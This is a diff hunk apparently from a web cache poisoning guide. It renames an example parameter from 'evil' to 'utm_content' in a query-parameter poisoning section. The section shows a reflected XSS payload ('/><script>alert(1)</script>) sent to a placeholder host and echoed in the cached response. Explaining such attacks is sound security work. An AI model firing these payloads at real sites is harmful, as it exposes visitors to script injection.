@@ -81,14 +81,14 @@ Vary: User-Agent, Accept-Encoding
 
 5. query parameter poisoning
 ```
-GET /?evil='/><script>alert(1)</script> HTTP/1.1
+GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
 Host: www.vuln.com
 
 ### Response:
 HTTP/1.1 200 OK
 X-Cache: miss, hit
 …
-<href="https://www.vuln.com/?evil='/><script>alert(1)</script>">
+<href="https://www.vuln.com/?utm_content='/><script>alert(1)</script>">
 ```
 
 6. Seizing the Cache
